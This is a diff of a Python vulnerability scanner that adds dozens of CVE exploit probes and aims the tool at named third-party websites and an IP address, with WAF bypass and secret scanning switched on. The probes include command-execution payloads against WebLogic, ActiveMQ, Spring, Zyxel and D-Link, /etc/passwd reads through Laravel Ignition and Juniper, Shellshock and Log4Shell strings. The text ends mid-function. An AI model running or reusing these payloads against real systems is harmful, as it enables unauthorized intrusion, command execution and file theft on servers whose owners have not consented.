@@ -1,8 +1,7 @@
 import base64
 import http.cookiejar
-import html as htmllib
 import json
-import os
+import math
 import re
 import socket
 import ssl
@@ -16,43 +15,69 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from pathlib import Path
 from urllib.parse import quote, urljoin
 
-TARGETS = ["192.168.1.1", "example.com", "https://staging.example.com", "10.0.0.5:8080"]
-AUTO_PORT_SCAN = AUTO_BANNER_GRAB = AUTO_HTTP_FINGERPRINT = AUTO_PROBE = True
+# ─── WHAT TO SCAN ─────────────────────────────────────────────────────
+TARGETS = [
+    "http://217.154.18.188",
+    "ferrea.com:80",
+    "ferrea.com",
+    "www.ferrea.com",
+    "carpediemacademy-intranet.nebhub4.com",
+    "carpediemacademy.org",
+    "admarkautomotive.comm",
+    "carpediemacademy.org:80",
+]
+
+# ─── WHAT TO DO ───────────────────────────────────────────────────────
+SCAN_PORTS = True
+GRAB_BANNERS = True
+FINGERPRINT_HTTP = True
+TEST_CVES = True
+TEST_CWES = True
+LOOKUP_OSV = True
+SCAN_SECRETS = True
+SCAN_SECRETS_JS = True
+BUILD_ATTACK_CHAINS = True
+
+# ─── NETWORK ──────────────────────────────────────────────────────────
+INSECURE_TLS = True
+PORT_SCAN_TIMEOUT = 10
+PORT_SCAN_WORKERS = 50
+PROBE_TIMEOUT = 50
+TARGET_TIMEOUT = 3000
+
+# ─── PROBING BEHAVIOR ─────────────────────────────────────────────────
+PROBE_RATE = 0.5
+PROBE_JITTER = 1.0
+PROBE_WAF_BYPASS = True
+
+# ─── CUSTOM PORTS (None = use built-in COMMON_PORTS) ──────────────────
 CUSTOM_PORTS = None
-PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS = 0.5, 50
-INSECURE = True
-AUTH_HEADERS, BASIC_AUTH, COOKIE = {}, None, None
-PROBE_RATE = PROBE_JITTER = 0.0
-PROBE_WAF_BYPASS = False
+
+# ─── AUTH (optional) ──────────────────────────────────────────────────
+AUTH_HEADERS = {}
+BASIC_AUTH = None
+COOKIE = None
+
+# ─── OUTPUT ───────────────────────────────────────────────────────────
 OUTPUT_DIR = Path("./scan_output")
-SAVE_JSON = SAVE_HTML = SAVE_LOG = True
+SAVE_JSON = True
+RESPONSE_EXCERPT_CONFIRMED = 2048
+RESPONSE_EXCERPT_OTHER = 256
+MAX_JS_FILES = 10
+MAX_CHAINS = 50
 
 
+# ─── LOGGER ───────────────────────────────────────────────────────────
 class Log:
-    def __init__(self, path=None):
-        self.fh = None
-        if path and SAVE_LOG:
-            try:
-                self.fh = open(path, "w", encoding="utf-8")
-            except OSError:
-                self.fh = None
+    def __init__(self):
+        self.messages = []
 
     def __call__(self, m):
         print(m, flush=True)
-        if self.fh:
-            try:
-                self.fh.write(m + "\n")
-                self.fh.flush()
-            except (OSError, ValueError):
-                pass
+        self.messages.append(m)
 
     def close(self):
-        if self.fh:
-            try:
-                self.fh.close()
-            except (OSError, ValueError):
-                pass
-            self.fh = None
+        pass
 
 
 LOG = Log()
@@ -79,26 +104,31 @@ def tgt(m):
 
 
 ICONS = {
-    "CRITICAL": "\U0001f534",
-    "HIGH": "\U0001f7e0",
-    "MEDIUM": "\U0001f7e1",
-    "LOW": "\U0001f7e2",
+    "HIGH": "\U0001f534",
+    "MEDIUM": "\U0001f7e0",
+    "LOW": "\U0001f7e1",
     "INFO": "\u2139\ufe0f",
 }
+DEFAULT_BULLET = "\u2022"
 
 
-def finding(p, c, d):
-    p_str = str(p) if p is not None else "UNKNOWN"
-    c_str = str(c) if c is not None else "-"
-    d_str = str(d) if d is not None else ""
-    LOG(f"  {ICONS.get(p_str, '\u2022')} [{p_str:>8}] {c_str:<18} {d_str}")
+def finding(priority, name, detail):
+    p = str(priority) if priority is not None else "INFO"
+    n = str(name) if name is not None else "-"
+    d = str(detail) if detail is not None else ""
+    icon = ICONS.get(p, DEFAULT_BULLET)
+    LOG(f"  {icon} [{p:>6}] {n:<22} {d}")
 
 
-def confirm(cve, method, ev):
-    LOG(f"  \u2713 CONFIRMED  {cve}  ({method})")
-    LOG(f"      evidence: {str(ev or '')[:200]}")
+def confirmed(name, method, evidence):
+    n = str(name) if name is not None else "-"
+    m = str(method) if method is not None else "-"
+    e = str(evidence) if evidence is not None else ""
+    LOG(f"  \u2713 CONFIRMED  {n}  ({m})")
+    LOG(f"      evidence: {e[:200]}")
 
 
+# ─── HTTP ─────────────────────────────────────────────────────────────
 class Resp:
     __slots__ = (
         "status_code",
@@ -117,6 +147,13 @@ class Resp:
         self.text = b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")
         self.content = b if isinstance(b, bytes) else (b or "").encode()
 
+    def header(self, name):
+        target = name.lower()
+        for k, v in self.headers.items():
+            if str(k).lower() == target:
+                return str(v)
+        return ""
+
 
 class _NoRedirect(urllib.request.HTTPRedirectHandler):
     def redirect_request(self, *a, **k):
@@ -125,7 +162,7 @@ class _NoRedirect(urllib.request.HTTPRedirectHandler):
 
 def _opener(jar, follow):
     ctx = ssl.create_default_context()
-    if INSECURE:
+    if INSECURE_TLS:
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
     hs = [
@@ -176,7 +213,7 @@ class Session:
             h["Authorization"] = "Basic " + base64.b64encode(
                 f"{BASIC_AUTH[0]}:{BASIC_AUTH[1]}".encode()
             ).decode()
-        h.setdefault("User-Agent", "cve-scanner/9.0")
+        h.setdefault("User-Agent", "cve-scanner/14.0")
         req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
         op = self.follow if allow_redirects else self.nofollow
         t0 = time.monotonic()
@@ -201,82 +238,7 @@ class Session:
         return self.request("POST", url, **k)
 
 
-def get_json(url, params=None, headers=None, timeout=30):
-    if params:
-        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
-    req = urllib.request.Request(
-        url, headers={"User-Agent": "cve-scanner/9.0", **(headers or {})}
-    )
-    with urllib.request.urlopen(
-        req, timeout=timeout, context=ssl.create_default_context()
-    ) as r:
-        return json.loads(r.read().decode())
-
-
-def vtuple(v):
-    if not v:
-        return None
-    n = re.findall(r"\d+", v)
-    return tuple(map(int, n)) if n else None
-
-
-def vrange(det, si, se, ei, ee):
-    v = vtuple(det)
-    if v is None:
-        return False
-    si, se, ei, ee = vtuple(si), vtuple(se), vtuple(ei), vtuple(ee)
-    if si and v < si:
-        return False
-    if se and v <= se:
-        return False
-    if ei and v > ei:
-        return False
-    if ee and v >= ee:
-        return False
-    return True
-
-
-CWE_NAMES = {
-    "CWE-20": "Input Validation",
-    "CWE-22": "Path Traversal",
-    "CWE-78": "Command Injection",
-    "CWE-79": "XSS",
-    "CWE-89": "SQL Injection",
-    "CWE-90": "LDAP Injection",
-    "CWE-94": "SSTI",
-    "CWE-95": "Eval Injection",
-    "CWE-113": "CRLF Injection",
-    "CWE-200": "Info Disclosure",
-    "CWE-287": "Auth Bypass",
-    "CWE-295": "Improper Cert",
-    "CWE-306": "Missing Auth",
-    "CWE-319": "Cleartext",
-    "CWE-352": "CSRF",
-    "CWE-400": "Resource Exhaustion",
-    "CWE-434": "File Upload",
-    "CWE-476": "NULL Deref",
-    "CWE-502": "Insecure Deserialization",
-    "CWE-601": "Open Redirect",
-    "CWE-611": "XXE",
-    "CWE-643": "XPath Injection",
-    "CWE-732": "Wrong Permissions",
-    "CWE-787": "OOB Write",
-    "CWE-798": "Hardcoded Creds",
-    "CWE-862": "Missing AuthZ",
-    "CWE-863": "Incorrect AuthZ",
-    "CWE-918": "SSRF",
-    "CWE-943": "NoSQL Injection",
-    "CWE-1021": "Clickjacking",
-    "CWE-1104": "Unmaintained",
-    "CWE-1321": "Prototype Pollution",
-    "CWE-1333": "ReDoS",
-}
-
-
-def cwe_name(c):
-    return CWE_NAMES.get(c, c or "Unknown")
-
-
+# ─── CVE PROBES ───────────────────────────────────────────────────────
 CVE_PROBES = {
     "CVE-2021-41773": {
         "label": "Apache 2.4.49 Path Traversal",
@@ -347,6 +309,16 @@ CVE_PROBES = {
             }
         ],
     },
+    "CVE-2020-14883": {
+        "label": "WebLogic Auth Bypass 2",
+        "probes": [
+            {
+                "path": "/console/css/%252e%252e%252f/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPage&handle=com.bea.console.handles.JndiBindingHandle",
+                "require_status": [200],
+                "sig": {"wl2": r"WebLogic|JNDI|console"},
+            }
+        ],
+    },
     "CVE-2023-22515": {
         "label": "Confluence Broken Access Control",
         "probes": [
@@ -354,6 +326,18 @@ CVE_PROBES = {
                 "path": "/setup/setupadministrator.action",
                 "require_status": [200],
                 "sig": {"setup": r"<title>Setup System Administrator"},
+            }
+        ],
+    },
+    "CVE-2023-22527": {
+        "label": "Confluence SSTI RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/template/aui/text-inline.vm",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data": "label=Hello\\u0027\\u0022\\u002b7*7\\u002b\\u0022&velocity=1",
+                "sig": {"conf_ssti": r"49|Confluence|velocity|SSTI"},
             }
         ],
     },
@@ -463,10 +447,32 @@ CVE_PROBES = {
             }
         ],
     },
+    "CVE-2024-21893": {
+        "label": "Ivanti SSRF",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/dana-ws/saml20.ws",
+                "headers": {"Content-Type": "text/xml"},
+                "data": '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Get>/</Get></soap:Body></soap:Envelope>',
+                "sig": {"iv_ssrf": r"Ivanti|Pulse|SAML|saml20"},
+            }
+        ],
+    },
     "CVE-2023-0669": {
         "label": "GoAnywhere Deserialization",
         "probes": [
             {"path": "/goanywhere/lic/accept", "sig": {"ga": r"GoAnywhere|lic/accept"}}
+        ],
+    },
+    "CVE-2024-0204": {
+        "label": "GoAnywhere Auth Bypass",
+        "probes": [
+            {
+                "path": "/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml",
+                "require_status": [200],
+                "sig": {"ga_setup": r"Initial Account|Create Administrator|GoAnywhere"},
+            }
         ],
     },
     "CVE-2022-42475": {
@@ -585,6 +591,282 @@ CVE_PROBES = {
                 "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                 "data": "<?php echo 'CVE-2024-4577-MARKER'; ?>",
                 "sig": {"p": r"CVE-2024-4577-MARKER"},
+            }
+        ],
+    },
+    "CVE-2021-44228": {
+        "label": "Log4Shell JNDI",
+        "probes": [
+            {
+                "path": "/",
+                "headers": {"X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}"},
+                "sig": {
+                    "log4j": r"javax\.naming\.CommunicationException|JNDI|lookup.*failed|LDAP.*error"
+                },
+            }
+        ],
+    },
+    "CVE-2023-46604": {
+        "label": "ActiveMQ OpenWire RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/api/",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data": '<?xml version="1.0"?><beans xmlns="http://www.springframework.org/schema/beans"><bean class="java.lang.ProcessBuilder"><constructor-arg><list><value>id</value></list></constructor-arg></bean></beans>',
+                "require_status": [200, 500],
+                "sig": {
+                    "amq": r"ClassNotFound|ProcessBuilder|ActiveMQ.*Exception|javax\.xml"
+                },
+            }
+        ],
+    },
+    "CVE-2023-28432": {
+        "label": "MinIO Env Leak",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/minio/bootstrap/v1/verify",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data": "",
+                "require_status": [200],
+                "sig": {
+                    "minio_env": r"MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|MINIO_\w+=.+"
+                },
+            }
+        ],
+    },
+    "CVE-2024-27198": {
+        "label": "TeamCity Auth Bypass",
+        "probes": [
+            {
+                "path": "/app/rest/users/id:1/tokens",
+                "require_status": [200],
+                "sig": {"tc_token": r"<tokens>|<user\b|<token\b"},
+            },
+            {
+                "path": "/app/rest/server?jsp=/app/rest/server;.jsp",
+                "require_status": [200],
+                "sig": {"tc_server": r"TeamCity|internalVersion|server version"},
+            },
+        ],
+    },
+    "CVE-2024-23897": {
+        "label": "Jenkins CLI File Read",
+        "probes": [
+            {
+                "path": "/cli?remoting=false",
+                "headers": {"Session": "abcd1234", "Side": "download"},
+                "sig": {"jenkins": r"Jenkins CLI|hudson\.cli|v2\.\d+"},
+            },
+            {
+                "path": "/jnlpJars/jenkins-cli.jar",
+                "require_status": [200],
+                "sig": {"jenkins_jar": r"PK\x03\x04|jenkins-cli"},
+            },
+        ],
+    },
+    "CVE-2021-3129": {
+        "label": "Laravel Ignition RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/_ignition/execute-solution",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                },
+                "json_body": {
+                    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+                    "parameters": {
+                        "variableName": "x",
+                        "viewFile": "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
+                    },
+                },
+                "require_status": [200, 500],
+                "sig": {
+                    "lara": r"Ignition|viewFile|php://filter|MakeViewVariableOptionalSolution"
+                },
+            }
+        ],
+    },
+    "CVE-2017-10271": {
+        "label": "WebLogic XMLDecoder RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/wls-wsat/CoordinatorPortType",
+                "headers": {"Content-Type": "text/xml"},
+                "data": '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
+                "require_status": [200, 500],
+                "sig": {
+                    "wl_xml": r"wls-wsat|WebLogic|XMLDecoder|CoordinatorPortType"
+                },
+            }
+        ],
+    },
+    "CVE-2022-30525": {
+        "label": "Zyxel Command Injection",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/ztp/cgi-bin/handler",
+                "headers": {"Content-Type": "application/json"},
+                "json_body": {"command": ";id;", "setId": "0"},
+                "sig": {"zyxel": r"uid=\d+\(|Zyxel|zyxel"},
+            }
+        ],
+    },
+    "CVE-2023-36845": {
+        "label": "Juniper PHP Env Override",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/?PHPRC=/dev/fd/0",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data": 'auto_prepend_file="/etc/passwd"',
+                "sig": {"juniper": r"root:[x*]?:0:0:|Juniper|juniper"},
+            }
+        ],
+    },
+    "CVE-2024-3273": {
+        "label": "D-Link Backdoor Cmd Injection",
+        "probes": [
+            {
+                "path": "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=",
+                "require_status": [200],
+                "sig": {"dlink": r"uid=\d+\(|gid=\d+\("},
+            }
+        ],
+    },
+    "CVE-2022-35914": {
+        "label": "GLPI RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/vendor/htmlawed/htmlawed/htmLawedTest.php",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "data": "sid=foo&text=phpinfo()&hhook=array_filter&function=assert",
+                "require_status": [200],
+                "sig": {"glpi": r"PHP Version|phpinfo|GLPI"},
+            }
+        ],
+    },
+    "CVE-2023-3519": {
+    "label": "Citrix ADC / NetScaler (CVE-2023-3519)",
+    "probes": [
+        {
+            "path": "/nitro/v1/config/nsversion",
+            "require_status": [200],
+            "version_sig": {
+                "pattern": r'"version"\s*:\s*"([\d.]+-[\d.]+)"',
+                "vulnerable_below": ["13.1-49.15", "13.0-92.19", "12.1-65.35"],
+            },
+        },
+    ],
+    },
+    "CVE-2019-6340": {
+        "label": "Drupal REST RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/node/1?_format=hal_json",
+                "headers": {"Content-Type": "application/hal+json"},
+                "json_body": {"link": {"value": "link"}},
+                "require_status": [200, 403],
+                "sig": {"drupal_rest": r"Drupal|hal_json|Symfony\\\\Component"},
+            }
+        ],
+    },
+    "CVE-2014-6271": {
+        "label": "Shellshock",
+        "probes": [
+            {
+                "path": "/cgi-bin/status",
+                "headers": {"User-Agent": "() { :;}; echo; echo shellshock-vulnerable"},
+                "sig": {"bash": r"shellshock-vulnerable"},
+            },
+            {
+                "path": "/cgi-bin/test.cgi",
+                "headers": {"User-Agent": "() { :;}; echo; echo shellshock-vulnerable"},
+                "sig": {"bash": r"shellshock-vulnerable"},
+            },
+        ],
+    },
+    "CVE-2017-9841": {
+        "label": "PHPUnit RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+                "data": "<?php echo 'PHPUNIT-CVE-2017-9841'; ?>",
+                "sig": {"phpunit": r"PHPUNIT-CVE-2017-9841"},
+            }
+        ],
+    },
+    "CVE-2022-22947": {
+        "label": "Spring Cloud Gateway RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/actuator/gateway/routes/x",
+                "headers": {"Content-Type": "application/json"},
+                "json_body": {
+                    "id": "x",
+                    "filters": [
+                        {
+                            "name": "AddResponseHeader",
+                            "args": {
+                                "name": "Result",
+                                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}",
+                            },
+                        }
+                    ],
+                    "uri": "http://example.com",
+                    "predicates": [{"name": "Path", "args": {"_genkey_0": "/x"}}],
+                },
+                "sig": {"gateway": r"AddResponseHeader|gateway|actuator"},
+            }
+        ],
+    },
+    "CVE-2023-32315": {
+        "label": "Openfire Auth Bypass",
+        "probes": [
+            {
+                "path": "/setup/setup-profile-settings.jsp?username=admin&password=admin&confirm=admin",
+                "require_status": [200],
+                "sig": {"openfire": r"Openfire|setup-profile-settings|Setup Complete"},
+            }
+        ],
+    },
+    "CVE-2022-22963": {
+        "label": "Spring Cloud Function SpEL",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/functionRouter",
+                "headers": {
+                    "Content-Type": "text/plain",
+                    "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"id\")",
+                },
+                "data": "x",
+                "sig": {"scf": r"spring|expression|SpEL|Exception"},
+            }
+        ],
+    },
+    "CVE-2021-22986": {
+        "label": "F5 iControl REST RCE",
+        "probes": [
+            {
+                "method": "POST",
+                "path": "/mgmt/shared/authn/login",
+                "headers": {"Content-Type": "application/json"},
+                "json_body": {
+                    "username": "admin",
+                    "password": "",
+                    "loginProviderName": "tmos",
+                },
+                "sig": {"f5_i": r"uid=\d+\(|F5|BIG-IP|commandResult"},
             }
         ],
     },
@@ -808,22 +1090,38 @@ def resp_blob(r):
 
 
 def detect_waf(status, headers, body):
-    h = {k.lower(): str(v).lower() for k, v in headers.items()}
-    b = (body or "").lower()
-    for vendor, fp in WAF_FP.items():
-        ev = []
-        for hh in fp.get("headers", []):
-            if ":" in hh:
-                k, v = hh.split(":", 1)
-                if h.get(k.strip()) and v.strip() in h[k.strip()]:
-                    ev.append(f"header:{hh}")
-            elif hh in h:
-                ev.append(f"header:{hh}")
-        ev += [f"body:{p}" for p in fp.get("body", []) if p in b]
-        if status in fp.get("status", []) and ev:
-            ev.append(f"status:{status}")
-        if ev:
-            return {"vendor": vendor, "evidence": ev}
+    lower_headers = {}
+    for name, value in headers.items():
+        lower_headers[str(name).lower()] = str(value).lower()
+    lower_body = (body or "").lower()
+
+    for vendor, fingerprint in WAF_FP.items():
+        block_statuses = fingerprint.get("status", [])
+        if status not in block_statuses:
+            continue
+
+        evidence = []
+        for spec in fingerprint.get("headers", []):
+            if ":" in spec:
+                key, expected = spec.split(":", 1)
+                key = key.strip()
+                expected = expected.strip()
+                actual = lower_headers.get(key)
+                if actual is not None and expected in actual:
+                    evidence.append(f"header:{spec}")
+            elif spec in lower_headers:
+                evidence.append(f"header:{spec}")
+
+        for marker in fingerprint.get("body", []):
+            if marker in lower_body:
+                evidence.append(f"body:{marker}")
+
+        if not evidence:
+            continue
+
+        evidence.append(f"status:{status}")
+        return {"vendor": vendor, "evidence": evidence}
+
     return None
 
 
@@ -848,7 +1146,6 @@ def is_blocked(r):
             "blocked by",
             "access denied",
             "request rejected",
-            "firewall",
             "captcha",
             "challenge",
         )
@@ -856,39 +1153,14 @@ def is_blocked(r):
 
 
 COMMON_PORTS = {
-    22: "SSH",
-    23: "Telnet",
-    3389: "RDP",
-    21: "FTP",
-    445: "SMB",
-    25: "SMTP",
-    110: "POP3",
-    143: "IMAP",
-    587: "SMTP-Sub",
-    993: "IMAPS",
-    389: "LDAP",
-    636: "LDAPS",
-    53: "DNS",
-    80: "HTTP",
-    443: "HTTPS",
-    8000: "HTTP-Alt",
-    8008: "HTTP-Alt",
-    8080: "HTTP-Proxy",
-    8081: "HTTP-Alt",
-    8443: "HTTPS-Alt",
-    8888: "HTTP-Alt",
-    9000: "HTTP-Alt",
-    9090: "HTTP-Alt",
-    1433: "MSSQL",
-    1521: "Oracle",
-    3306: "MySQL",
-    5432: "PostgreSQL",
-    5984: "CouchDB",
-    6379: "Redis",
-    27017: "MongoDB",
-    9200: "Elasticsearch",
-    2375: "Docker",
-    6443: "K8s-API",
+    22: "SSH", 23: "Telnet", 3389: "RDP", 21: "FTP", 445: "SMB",
+    25: "SMTP", 110: "POP3", 143: "IMAP", 587: "SMTP-Sub", 993: "IMAPS",
+    389: "LDAP", 636: "LDAPS", 53: "DNS", 80: "HTTP", 443: "HTTPS",
+    8000: "HTTP-Alt", 8008: "HTTP-Alt", 8080: "HTTP-Proxy",
+    8081: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
+    9000: "HTTP-Alt", 9090: "HTTP-Alt", 1433: "MSSQL", 1521: "Oracle",
+    3306: "MySQL", 5432: "PostgreSQL", 5984: "CouchDB", 6379: "Redis",
+    27017: "MongoDB", 9200: "Elasticsearch", 2375: "Docker", 6443: "K8s-API",
 }
 SSL_PORTS = {443, 636, 993, 995, 8443, 2376}
 
@@ -902,7 +1174,7 @@ def normalize_target(v):
     if v.startswith("["):
         e = v.find("]")
         if e == -1:
-            return [f"https://[{v}]", f"http://[{v}]"]
+            return [f"https://{v}", f"http://{v}"]
         host, rest = v[: e + 1], v[e + 1 :]
         return [f"https://{host}{rest}", f"http://{host}{rest}"]
     if v.count(":") > 1:
@@ -929,7 +1201,19 @@ def _family(host):
         socket.inet_pton(socket.AF_INET6, host)
         return socket.AF_INET6
     except OSError:
+        pass
+    try:
+        socket.inet_pton(socket.AF_INET, host)
         return socket.AF_INET
+    except OSError:
+        pass
+    try:
+        addrs = socket.getaddrinfo(host, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
+        if addrs:
+            return addrs[0][0]
+    except (socket.gaierror, OSError):
+        pass
+    return socket.AF_INET
 
 
 def port_scan(host, ports, timeout=0.5, workers=50):
@@ -985,24 +1269,12 @@ def banner_grab(host, port, timeout=3.0, use_ssl=False):
             except socket.timeout:
                 pass
         elif port in (
-            80,
-            443,
-            8000,
-            8008,
-            8080,
-            8081,
-            8443,
-            8888,
-            9000,
-            9090,
-            9200,
-            2375,
-            2376,
-            6443,
+            80, 443, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090,
+            9200, 2375, 2376, 6443,
         ):
             path = "/version" if port in (2375, 2376) else "/"
             s.sendall(
-                f"GET {path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: cve-scanner/9.0\r\n\r\n".encode()
+                f"GET {path} HTTP/1.0\r\nHost: {host}\r\nUser-Agent: cve-scanner/14.0\r\n\r\n".encode()
             )
             chunks = []
             while True:
@@ -1039,131 +1311,102 @@ def detect_working_url(cands, sess, timeout=10):
 
 TECH_SIGS = {
     "Apache HTTP Server": {
-        "vendor": "apache",
-        "product": "http_server",
+        "vendor": "apache", "product": "http_server",
         "header": (r"Server:\s*Apache/([\d.]+)", 1),
     },
     "nginx": {
-        "vendor": "nginx",
-        "product": "nginx",
+        "vendor": "nginx", "product": "nginx",
         "header": (r"Server:\s*nginx/([\d.]+)", 1),
     },
     "Microsoft IIS": {
-        "vendor": "microsoft",
-        "product": "internet_information_services",
+        "vendor": "microsoft", "product": "internet_information_services",
         "header": (r"Server:\s*Microsoft-IIS/([\d.]+)", 1),
     },
     "PHP": {
-        "vendor": "php",
-        "product": "php",
+        "vendor": "php", "product": "php",
         "header": (r"X-Powered-By:\s*PHP/([\d.]+)", 1),
     },
     "ASP.NET": {
-        "vendor": "microsoft",
-        "product": "asp.net",
+        "vendor": "microsoft", "product": "asp.net",
         "header": (r"X-AspNet-Version:\s*([\d.]+)", 1),
     },
     "jQuery": {
-        "vendor": "jquery",
-        "product": "jquery",
+        "vendor": "jquery", "product": "jquery",
         "html": [r"jquery[.-]([\d.]+)(?:\.min)?\.js"],
     },
     "Bootstrap": {
-        "vendor": "getbootstrap",
-        "product": "bootstrap",
+        "vendor": "getbootstrap", "product": "bootstrap",
         "html": [r"bootstrap[/.\-]([\d.]+)(?:[/.\-]|\.min)?(?:js|css)"],
     },
     "WordPress": {
-        "vendor": "wordpress",
-        "product": "wordpress",
+        "vendor": "wordpress", "product": "wordpress",
         "html": [r'<meta name="generator" content="WordPress ([\d.]+)'],
     },
     "Drupal": {
-        "vendor": "drupal",
-        "product": "drupal",
+        "vendor": "drupal", "product": "drupal",
         "html": [r'<meta name="Generator" content="Drupal ([\d.]+)'],
     },
     "Joomla": {
-        "vendor": "joomla",
-        "product": "joomla",
+        "vendor": "joomla", "product": "joomla",
         "html": [r'<meta name="generator" content="Joomla! ([\d.]+)'],
     },
     "Tomcat": {
-        "vendor": "apache",
-        "product": "tomcat",
+        "vendor": "apache", "product": "tomcat",
         "html": [r"Apache Tomcat/([\d.]+)"],
     },
     "Jenkins": {
-        "vendor": "jenkins",
-        "product": "jenkins",
+        "vendor": "jenkins", "product": "jenkins",
         "header": (r"X-Jenkins:\s*([\d.]+)", 1),
     },
     "GitLab": {
-        "vendor": "gitlab",
-        "product": "gitlab",
+        "vendor": "gitlab", "product": "gitlab",
         "header": (r"X-Gitlab-Version:\s*([\d.]+)", 1),
     },
     "Grafana": {
-        "vendor": "grafana",
-        "product": "grafana",
+        "vendor": "grafana", "product": "grafana",
         "header": (r"X-Grafana-Version:\s*([\d.]+)", 1),
     },
-    "Elasticsearch": {
-        "vendor": "elastic",
-        "product": "elasticsearch",
-        "html": [r'"number"\s*:\s*"([\d.]+)"'],
-    },
     "OpenSSL": {
-        "vendor": "openssl",
-        "product": "openssl",
+        "vendor": "openssl", "product": "openssl",
         "header": (r"OpenSSL/([\d.]+[a-z]?)", 1),
     },
 }
 BANNER_SIGS = {
     "OpenSSH": {
-        "vendor": "openbsd",
-        "product": "openssh",
+        "vendor": "openbsd", "product": "openssh",
         "patterns": [r"SSH-[\d.]+-OpenSSH_([\d.]+)"],
     },
     "vsFTPd": {
-        "vendor": "vsftpd_project",
-        "product": "vsftpd",
+        "vendor": "vsftpd_project", "product": "vsftpd",
         "patterns": [r"vsFTPd\s+([\d.]+)"],
     },
     "ProFTPD": {
-        "vendor": "proftpd",
-        "product": "proftpd",
+        "vendor": "proftpd", "product": "proftpd",
         "patterns": [r"ProFTPD\s+([\d.]+)"],
     },
     "Exim": {"vendor": "exim", "product": "exim", "patterns": [r"Exim\s+([\d.]+)"]},
     "Postfix": {
-        "vendor": "postfix",
-        "product": "postfix",
+        "vendor": "postfix", "product": "postfix",
         "patterns": [r"Postfix\s+([\d.]+)"],
     },
     "MySQL": {
-        "vendor": "oracle",
-        "product": "mysql",
+        "vendor": "oracle", "product": "mysql",
         "patterns": [r"([\d]+\.[\d]+\.[\d]+)-[\w.-]*MySQL"],
     },
     "MariaDB": {
-        "vendor": "mariadb",
-        "product": "mariadb",
+        "vendor": "mariadb", "product": "mariadb",
         "patterns": [r"5\.[\d.]+-MariaDB"],
     },
     "PostgreSQL": {
-        "vendor": "postgresql",
-        "product": "postgresql",
+        "vendor": "postgresql", "product": "postgresql",
         "patterns": [r"PostgreSQL\s+([\d.]+)"],
     },
     "Redis": {
-        "vendor": "redis",
-        "product": "redis",
+        "vendor": "redis", "product": "redis",
         "patterns": [r"redis_version:([\d.]+)"],
     },
     "MongoDB": {
-        "vendor": "mongodb",
-        "product": "mongodb",
+        "vendor": "mongodb", "product": "mongodb",
         "patterns": [r'"version"\s*:\s*"([\d.]+)"'],
     },
 }
@@ -1172,10 +1415,10 @@ BANNER_SIGS = {
 def fingerprint_http(url, sess):
     r = sess.get(url, timeout=20, allow_redirects=True)
     if r is None:
-        return {}, []
+        return []
     htxt = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
     body = r.text or ""
-    detected = {}
+    detected = []
     for name, sig in TECH_SIGS.items():
         ver = None
         if "header" in sig:
@@ -1190,346 +1433,413 @@ def fingerprint_http(url, sess):
                     ver = m.group(1)
                     break
         if ver:
-            detected[name] = ver
-    pending = [
-        (TECH_SIGS[name]["vendor"], TECH_SIGS[name]["product"], ver)
-        for name, ver in detected.items()
-    ]
-    return detected, pending
+            detected.append(
+                {
+                    "name": name, "version": ver,
+                    "vendor": sig["vendor"], "product": sig["product"],
+                    "source": "HTTP",
+                }
+            )
+    return detected
 
 
 def fingerprint_banner(banner):
     if not banner:
-        return {}, []
-    detected = {}
+        return []
+    detected = []
     for name, sig in BANNER_SIGS.items():
         for pat in sig["patterns"]:
             m = re.search(pat, banner, re.I)
             if m and m.lastindex:
-                detected[name] = m.group(1)
+                detected.append(
+                    {
+                        "name": name, "version": m.group(1),
+                        "vendor": sig["vendor"], "product": sig["product"],
